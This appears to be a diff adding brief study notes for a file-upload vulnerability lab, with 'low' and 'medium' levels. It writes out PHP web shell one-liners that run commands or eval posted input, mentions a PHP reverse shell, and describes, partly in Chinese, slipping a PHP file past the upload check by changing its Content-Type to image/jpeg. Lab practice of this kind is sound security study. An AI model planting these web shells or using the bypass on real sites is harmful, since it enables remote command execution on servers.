@@ -1,0 +1,15 @@
+file upload 
+
+low:
+    ?php system($_REQUEST["cmd"]);?>
+    reverse-shell-php -->
+
+    ?php @eval($_POST['a']); ?>
+    url:xxx.php?a=XXX
+    https://blog.csdn.net/sinat_35058227/article/details/119978861
+
+mediumn:
+    將 Content-Type: application/x-php 換成 /image/jpeg
+    
+
+    .php 內容也可以換成 reverse shell 的內容
